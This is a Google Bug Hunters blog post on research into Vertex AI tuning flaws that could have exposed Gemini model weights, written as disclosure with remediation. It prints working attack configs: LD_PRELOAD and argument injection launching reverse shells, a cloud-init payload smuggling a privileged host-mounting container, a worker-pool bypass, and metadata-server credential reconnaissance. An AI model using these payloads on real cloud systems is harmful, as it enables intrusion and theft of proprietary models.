---
source: bughunters
source_url: https://bughunters.google.com/blog/protecting-large-language-models
title: "Protecting Large Language Models - Google Bug Hunters"
description: "This blog post describes Google's approach to vulnerability research on our Cloud AI Platform, Vertex AI. We're sharing this so that external researchers can learn from our work and to help them discover new vulnerabilities."
---

[Skip to Content (Press Enter)](https://bughunters.google.com/blog/protecting-large-language-models#main-content)

[**Google Bug Hunters**](https://bughunters.google.com/)

1blog enterBlog

# Protecting Large Language Models

![](https://storage.googleapis.com/bughunters-article-images/blogs/amlw.jpg)

Anthony Weems

Information Security Engineer

Published: Oct 4, 2024

Cloud Vulnerability Research  Product Security Engineering  Cloud CISO  Google Cloud

[RSS Feed](https://bughunters.google.com/feed/en)

# Protecting Large Language Models

AI security encompasses a broad range of infrastructure defenses, application
security, detection and response, trust and safety controls, and vulnerability
research. This research space has evolved rapidly over the last few years with
the development of new model-specific vulnerabilities such as indirect prompt
injection or glitch tokens. We have also seen research on AI platforms
demonstrating more classic attacks against the underlying infrastructure like
remote code execution via deserialization and lambda layers.

In 2023, prior to the launch of Gemini, Google CVR \[1\] performed
vulnerability research on Google Cloud’s AI Platform,
[Vertex AI](https://cloud.google.com/vertex-ai). In this research, we considered
a broad range of potential attack scenarios across Google as well as the
industry. We discovered previously unknown vulnerabilities that, if not
remediated, potentially could have allowed the exfiltration of Google's Gemini
1.0 Pro model. These vulnerabilities were remediated before Gemini tuning
launched on Vertex AI. We continued this research on another large Cloud
provider, discovered similar vulnerabilities in their tuning architecture, and
reported these vulnerabilities using their standard vulnerability disclosure
process.

This blog post describes our process so that external researchers can learn from
our work and to help them discover new vulnerabilities. We detail our findings,
how we found and fixed the issues internally, and how we reported our findings
to similar cloud providers. AI security is an emerging space and the industry is
learning together on how best to analyze and secure it. We expect to see further
research in this area as the industry evolves.

> **Bug Hunter Tip**: Google's Vulnerability Rewards Program explicitly includes
> model theft in its
> [scope](https://bughunters.google.com/about/rules/google-friends/5238081279623168/abuse-vulnerability-reward-program-rules#qualifying-vulnerabilities-in-ai-products).
> Be careful to evaluate the rules of any other bug bounty program as they might
> not allow this testing.

\[1\] Google Cloud Vulnerability Research (CVR) is an offensive security research
team within Google Cloud. Our mission is to find and exploit high impact
vulnerabilities in Google Cloud, uncovering interesting attack surfaces and
unknown unknowns. In short, we hack Cloud to make Cloud more secure.

## Vertex Research

### Background

Vertex AI is a fully-managed, unified AI development platform for building and
using generative AI. We initially focused on one feature of Vertex,
[custom training](https://cloud.google.com/vertex-ai/docs/training/overview),
which provides a managed training service that enables you to operationalize
large scale model training. From a security perspective, this service is
interesting as it deliberately executes customer code.

Behind the scenes, all of these mechanisms eventually deploy customer-provided
container images to either a GKE cluster or GCE VM in an isolated environment
called a
" [tenant project](https://cloud.google.com/service-infrastructure/docs/glossary#tenant)".
Google uses tenant projects to host managed resources for each customer of a
Cloud product. For example, a customer's Vertex training job runs as a managed
VM inside a dedicated tenant project for that customer. Tenant projects are one
of the many isolation primitives we use in Cloud to prevent cross-tenant
vulnerabilities.

> **Bug Hunter Tip**: You can recognize tenant projects by their name, which
> will generally be a string of random characters ending with "-tp". For
> example: 9efd0213678c10f935-tp.

To access resources in the customer's project and to manage resources in tenant
projects, Vertex uses a Cloud service agent. Service agents are
per-product-per-project service accounts (P4SAs), managed by Google and used to
orchestrate customer resources. Service agents are automatically granted roles
in customer projects upon API activation and we publish a list of service agents
with these roles [here](https://cloud.google.com/iam/docs/service-agents).

> **Bug Hunter Tip**: You can recognize a service agent by its name, which will
> generally look something like
> " [service-1234@gcp-sa-foobar.iam.gserviceaccount.com](mailto:service-1234@gcp-sa-foobar.iam.gserviceaccount.com)". In this case, _1234_ is
> the customer project number and _foobar_ is the product name.

Vertex jobs often need some level of access to the customer project, e.g. for
reporting results or accessing storage. To provide this access, custom training
jobs run VMs as the customer's `gcp-sa-aiplatform-cc` service agent.

This "Custom Code Service Agent" is a dedicated P4SA that is intended to be
exposed to customers (e.g. running customer-provider code). This is in contrast
to the "Primary" service agent for Vertex AI, `gcp-sa-aiplatform`, which is not
intended to be directly accessible to customers. Throughout this blog post, we
will refer to these service agents simply as the CC P4SA
(`gcp-sa-aiplatform-cc`) and the Primary P4SA (`gcp-sa-aiplatform`).

#### Tuning

_Note: The tuning architecture and user experience have changed since this_
_vulnerability research, this section contains outdated information, which we_
_include to better explain the research process._

In addition to customer models, Vertex AI also provides access to Google's
state-of-the-art Generative AI models like Gemini 1.5 Pro and Gemini 1.5 Flash.
These models are Google's intellectual property and the underlying model weights
are not public. Vertex allows customers to
[tune](https://cloud.google.com/vertex-ai/docs/generative-ai/models/tune-models)
these models to perform specialized tasks. This tuning process uses a similar
mechanism as other Vertex features, but must somehow access model checkpoints
for training without exposing them to customers.

To accomplish this task, Vertex created a restricted tenant project, separate
from the normal custom training tenant project, which was used specifically for
tuning and accessing sensitive model weights.

![](https://storage.googleapis.com/bughunters-article-images/blogs/cvr-vertex_01.png)

_Fig. 1. Tuning pipeline_

While the CC P4SA was used for the majority of training jobs, the tuning
pipeline above used a service account with higher privileges to access the
sensitive Google IP components (the Primary P4SA). As described above, the
Primary P4SA is not intended to be exposed to customers and is typically only
used by the Vertex control plane to manage customer resources. To support
tuning, the Primary P4SA was added to an internal IAM binding granting it access
to model weights and tuning containers.

### Reconnaissance

#### Custom Training

The simplest Vertex sub-product from an attacker perspective is Custom Training.
This sub-product allows customers to provide a container image which Vertex
orchestrates and runs in the customer's "training" tenant project. It is
important to note that custom training intentionally runs arbitrary customer
code, so the reconnaissance we describe below is expected behavior.

To explore the training environment, we created a container with a reverse shell
and used the following config to deploy a custom training job:

```
$ cat config.yaml
workerPoolSpecs:
  machineSpec:
    machineType: e2-standard-4
    acceleratorType: ACCELERATOR_TYPE_UNSPECIFIED
  replicaCount: 1
  containerSpec:
    imageUri: gcr.io/cvr-1234567890/shell:latest
$ gcloud ai custom-jobs create --config=config.yaml --display-name "job-$(date +%s)"
```

The Google Cloud REST API
[documentation](https://cloud.google.com/vertex-ai/docs/reference/rest/v1/CustomJobSpec)
contains a full description of all supported configuration options for custom
training jobs, including the ability to set an entrypoint, environment
variables, and container args.

This job creates a GCE VM in the training tenant project running as the CC P4SA.
We can verify this with the following commands inside the container:

```
$ curl -sI http://169.254.169.254 | grep Server:
Server: Metadata Server for VM

$ curl http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email \
    -H Metadata-Flavor:Google \
service-1234567890@gcp-sa-aiplatform-cc.iam.gserviceaccount.com

$ curl http://169.254.169.254/computeMetadata/v1/project/project-id \
    -H Metadata-Flavor:Google \
9efd0213678c10f935-tp
```

We also explored the environment variables, mounts, and startup script.
Interesting snippets from these are shown below:

```
$ env
CLOUD_ML_JOB={"python_module":"","package_uris":[],"job_args":[]}
AIP_USE_CUSTOM_CONTAINER=true
CLOUD_ML_JOB_SA=service-1234567890@gcp-sa-aiplatform-cc.iam.gserviceaccount.com
CLOUD_ML_PROJECT_ID=1234567890
CLOUD_ML_REGION=us-central1

$ mount
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/<snip>)
gcsfuse on /gcs type fuse.gcsfuse (rw,<snip>)

$ curl http://169.254.169.254/computeMetadata/v1/instance/attributes/user-data \
    -H Metadata-Flavor:Google
#cloud-config
write_files:
- path: /var/training.sh
- path: <snip>
runcmd:
- systemctl daemon-reload
- <snip>
```

The last snippet shown above contains the "cloud-init" for our VM, which is an
[open standard](https://cloudinit.readthedocs.io/en/latest/) for customizing
cloud VMs. The YAML config contains a list of files and commands to set up the
VM on initial boot. This will become relevant later, but for now, we simply note
its use and move on.

> **Bug Hunter Tip**: The metadata service (MDS) provides lots of interesting
> information about your environment. Always check the MDS when you get a shell
> and consider including this information in any vulnerability reports to help
> us determine impact.

#### Tuning

At the time of our research, tuning was implemented using a feature of Vertex
called Pipelines which orchestrates a graph of containers that can pass
inputs/outputs to each other. We created a tuning job in the Cloud Console which
created a Vertex Pipeline in our project with the following steps:

![](https://storage.googleapis.com/bughunters-article-images/blogs/cvr-vertex_02.png)

_Fig. 2. Tuning Pipeline showing the various steps in the tuning process_

Each Pipeline step created a Training job which we examined to view its
configuration as shown below:

![](https://storage.googleapis.com/bughunters-article-images/blogs/cvr-vertex_03.png)

_Fig. 3. Tuning training job showing (redacted) internal container image and_
_command line arguments_

Attempting to pull this container returned the following error:

```
$ docker pull us-docker.pkg.dev/path-to/llm/llm-gpu:v2.2.0
Unauthenticated request. Unauthenticated requests do not have permission "artifactregistry.repositories.downloadArtifacts" on resource "projects/path-to/locations/us/repositories/llm" (or it may not exist)
```

We then attempted to create our own custom training job with this internal
container image:

```
workerPoolSpecs:
  machineSpec:
    machineType: e2-standard-4
    acceleratorType: ACCELERATOR_TYPE_UNSPECIFIED
  replicaCount: 1
  containerSpec:
    imageUri: us-docker.pkg.dev/path-to/llm/llm-gpu:v2.2.0
```

Even though we do not have access to the container image, this job succeeded.
How? At the time, Vertex routed the job to the restricted tenant project based
on the provided container image. In this internal project, the service agent
used by the VM had no issues accessing the internal container image.

As a next step, we tried a very simple attack: what if we just change the
entrypoint for the container:

```
workerPoolSpecs:
  machineSpec:
    machineType: e2-standard-4
    acceleratorType: ACCELERATOR_TYPE_UNSPECIFIED
  replicaCount: 1
  containerSpec:
    imageUri: us-docker.pkg.dev/path-to/llm/llm-gpu:v2.2.0
    command: ["sleep", "10"]
```

To our surprise, we received a very interesting error in response:

"Cannot set command arguments for private container config."

At this point, we knew the following:

1. Tuning eventually creates a custom job, with some validation on the fields
(e.g. command).
2. The VM created by this job is likely to in some way have access to model
weights for tuning.
3. Custom jobs have a wide range of runtime parameters and fields we might
control.
4. If we gain code execution in this job, we might have access to model
weights.

With this in mind, we set out to find remote code execution (RCE) in the tuning
container with the ultimate goal of model theft.

### Vulnerabilities

Below are a subset of the vulnerabilities we found that allowed us to access the
model weights. Most of the vulnerabilities were different injection points in
the
[CustomJobSpec](https://cloud.google.com/vertex-ai/docs/reference/rest/v1/CustomJobSpec).
As described in the remediation section, this API was designed for customers and
not the restricted tuning environment.

#### \#1: Environment Variables Injection

While we were unable to create restricted jobs with a custom entrypoint, we were
permitted to modify the environment variables for the job. In most cases, an
attacker that controls environment variables can gain code execution in the
victim process.

The simplest example of this is `LD_PRELOAD`, which is used by the Linux dynamic
linker (ld.so) to load a user-specified ELF shared object before other
libraries. If we could place a malicious shared object in the tuning job's
filesystem, we could load it with `LD_PRELOAD` and gain arbitrary code
execution.

As we observed in the Reconnaissance section, the standard custom training
container had a gcsfuse mount located at `/gcs`. Assuming this was the same in
tuning, we uploaded a shared object to Google Cloud Storage (GCS) and used the
following config to spawn a job with a malicious environment variable, giving us
remote code execution in tuning:

```
workerPoolSpecs:
  machineSpec:
    machineType: e2-standard-4
    acceleratorType: ACCELERATOR_TYPE_UNSPECIFIED
  replicaCount: 1
  containerSpec:
    imageUri: us-docker.pkg.dev/path-to/llm/llm-gpu:v2.2.0
    env:
      - name: LD_PRELOAD
        value: /gcs/cvr-1234567890/shell.so
```

This gave us a shell as the Primary P4SA, which is not intended to be exposed to
customers:

```
# reverse shell from tuning job
$ curl http://169.254.169.254/computeMetadata/v1/instance/?recursive=true \
   -H Metadata-Flavor:Google
"serviceAccounts": {
 "default": {
  "email": "service-1234567890@gcp-sa-aiplatform.iam.gserviceaccount.com",
  "scopes": [\
   "https://www.googleapis.com/auth/devstorage.full_control",\
   "https://www.googleapis.com/auth/pubsub",\
   "https://www.googleapis.com/auth/cloud.ml.engine.internal",\
   "https://www.googleapis.com/auth/cloud-platform.read-only"\
  ]
 }
```

#### \#2: Argument Injection

As seen in the Reconnaissance section, the real world tuning job used container
arguments (instead of the entrypoint) to pass inputs like the user's training
data, the tuned model, etc. While we were unable to set a custom entrypoint, we
were able to set arbitrary arguments to the entrypoint in the private container.

There are several cases in which malicious arguments might lead to code
execution in an unknown container image (ordered by increasing difficulty to
find/exploit):

1. Images that do not set an entrypoint would treat args as the entry point and
allow an attacker to execute arbitrary binaries within the image
2. Images that use an interpreter-esque binary as their entrypoint (e.g.
`["python3"]`) would allow an attacker to easily influence code execution
without needing to control the binary executed
3. Images with an entrypoint that has a dangerous flag (e.g.
`--checkpoint-action=exec=` in tar) would allow an attacker to run arbitrary
commands at runtime
4. Images that have a vulnerability which allows for arbitrary code execution
when processing attacker input (e.g. memory corruption when parsing training
data)

Using our internal access, we enumerated the set of all possible tuning
container images and created an analysis pipeline to automatically find
containers vulnerable to type (1) and (2). We found several vulnerable
containers, including one container with an Nvidia base image which set the
entrypoint to "/nvidia\_entrypoint.sh". This script was simply a wrapper around
"exec" (with some code to set up GPU drivers). An example of this base image is
nvcr.io/nvidia/pytorch:23.04-py3.

To exploit this, we created a custom job referencing this nvidia container, and
set the args array to point to a reverse shell hosted in GCS:

```
workerPoolSpecs:
  machineSpec:
    machineType: n1-standard-4
    acceleratorType: NVIDIA_TESLA_T4
    acceleratorCount: 1
  replicaCount: 1
  containerSpec:
    imageUri: us-docker.pkg.dev/path-to/an/nvidia/container:latest
    args: ["/gcs/cvr-1234567890/exploit.sh"]
```

#### \#3: Cloud-Init Injection

As mentioned in the Reconnaissance section, the custom training VMs were
configured using a cloud-init config, which is a YAML config describing initial
files and commands to run on VM boot. In our custom training VM, we reviewed the
cloud-init and discovered that several strings were influenced by fields in the
[CustomJobSpec](https://cloud.google.com/vertex-ai/docs/reference/rest/v1/CustomJobSpec).
For example, see the following snippet from the cloud-init:

```
# Tensorboard Uploader
- path: /etc/systemd/system/cmle-tensorboard-uploader.service
  permissions: 0644
  owner: root
  content: |
    [Service]
    Type=simple
    Environment="HOME=/home/cmle"
    ExecStartPre=-/usr/bin/docker rm -f -v workerpool0-0-tensorboard-uploader
    ExecStart=/usr/bin/docker run \
      --net=training-network \
      --name=workerpool0-0-tensorboard-uploader \
      us-docker.pkg.dev/vertex-ai/tensorboard/uploader \
        --logdir=gs://cvr-1234567890/logs/ \
        --experiment_name=1481734648781340672 --one_shot=False \
```

The `--logdir` argument above was directly influenced by the
`baseOutputDirectory.outputUriPrefix` field in the CustomJobSpec. Effectively,
we could inject arbitrary data into the cloud-init config, as long as it looked
like a GCS bucket path. We could, for example, inject a newline followed by a
new `"- path: /foo"` and overwrite some system script/binary.

At Google, most injection-style vulnerabilities are engineered away using safe
libraries (e.g. XSS, SQLi, YAML injection, path traversal). We
[recently](https://bughunters.google.com/blog/4925068200771584/the-family-of-safe-golang-libraries-is-growing)
open sourced [google/safetext](https://github.com/google/safetext), a drop-in
replacement for text/template that protects against YAML injection. The library
uses a clever trick to detect changes in YAML structure with and without the
potential malicious input.

However, in our case, we do not necessarily need to inject new YAML elements.
Instead we can inject into the current systemd service and set a new option for
the TensorBoard service (e.g. ExecStartPre), which is not protected by safetext.
To accomplish this, we used a payload like the following to start a new
privileged container and launch a reverse shell:

```
workerPoolSpecs:
  machineSpec:
    machineType: e2-standard-4
    acceleratorType: ACCELERATOR_TYPE_UNSPECIFIED
  replicaCount: 1
  containerSpec:
    imageUri: us-docker.pkg.dev/path-to/llm/llm-gpu:v2.2.0
baseOutputDirectory:
  outputUriPrefix: "gs://cvr-1234567890/logs/\r    ExecStartPre=/usr/bin/docker run --privileged --net=host -v /:/host gcr.io/cvr-1234567890/shell\r    #"
tensorboard: projects/1234567890/locations/us-central1/tensorboards/69102150...
```

#### \#4: Multi-container Job Bypass

While reviewing the
[CustomJobSpec](https://cloud.google.com/vertex-ai/docs/reference/rest/v1/CustomJobSpec),
we realized that "workerPoolSpecs" is actually a repeated field. We discovered
that we could submit a custom job with two worker pools, one with a private
tuning image, and the other with our own custom image. The job scheduler
iterated over the container images in the worker pools and scheduled the entire
job in the restricted tenant project if any image was an internal image. We used
a payload like the following to launch a job with both the internal image and
our reverse shell:

```
workerPoolSpecs:
- machineSpec:
    machineType: e2-standard-4
    acceleratorType: ACCELERATOR_TYPE_UNSPECIFIED
  replicaCount: 1
  containerSpec:
    imageUri: gcr.io/cvr-1234567890/shell:latest
- machineSpec:
    machineType: e2-standard-4
    acceleratorType: ACCELERATOR_TYPE_UNSPECIFIED
  replicaCount: 1
  containerSpec:
    imageUri: us-docker.pkg.dev/path-to/llm/llm-gpu:v2.2.0
```

### Remediation

As demonstrated in the vulnerabilities above, we found several paths to gain
code execution within a tuning job, which inherently provides access to the
model. This was due to the architecture of tuning at the time, which allowed
users to schedule custom training jobs that provided many avenues to configure
and influence the runtime environment used for tuning.

In fact, CVR has performed similar research on another cloud and discovered very
similar vulnerabilities in their tuning architecture. In response to our
findings, the cloud provider removed support for tuning a sensitive model in
their vulnerable architecture.

To remediate these vulnerabilities, Vertex rearchitected tuning. Instead of
custom jobs, tuning now has a dedicated API with strict input validation and
minimized attack surface. Additionally, the Primary P4SA is no longer granted
access to internal Gemini resources. We also enhanced our detection and response
capabilities in Vertex-managed resources which we have used to detect early
stages of reconnaissance by security researchers that participate in our
vulnerability rewards program.

The service agent
[documentation](https://cloud.google.com/iam/docs/service-agents) includes these
new P4SAs (gcp-sa-vertex-tune, or gcp-sa-vertex-shtune). Unlike services that
intentionally provide code execution – like custom jobs – **we consider code**
**execution or confused deputy issues in the context of these identities as**
**vulnerabilities in scope for Google VRP.**

## Conclusion

Our ongoing partnership with researchers is essential to ensuring the safety and
security of our customers and users, and to further advancing AI security across
Google Cloud. We hope this blog post helps better explain the internals of
Vertex AI, and inspires you to join the hunt for vulnerabilities in Google Cloud
and across the industry.

If you discover a potential security issue, please submit your VRP report as
soon as possible (e.g. code execution as a P4SA). As a reminder, Model Theft is
in scope for Google VRP. Security researchers looking to explore this attack
surface should reference the
[Tune Gemini models by using supervised tuning](https://cloud.google.com/vertex-ai/generative-ai/docs/models/gemini-use-supervised-tuning)
Cloud documentation to get started. The new architecture exposes a dedicated
tuning API, which is also documented in the REST API reference
( [projects.tuningJobs.create](https://cloud.google.com/vertex-ai/docs/reference/rest/v1/projects.locations.tuningJobs/create)).
For more details, please refer to the program
[rules](https://bughunters.google.com/about/rules/google-friends/5238081279623168/abuse-vulnerability-reward-program-rules).

[Back to overview](https://bughunters.google.com/blog)

Sign In - Google Accounts

Sign inSign in with Google. Opens in new tab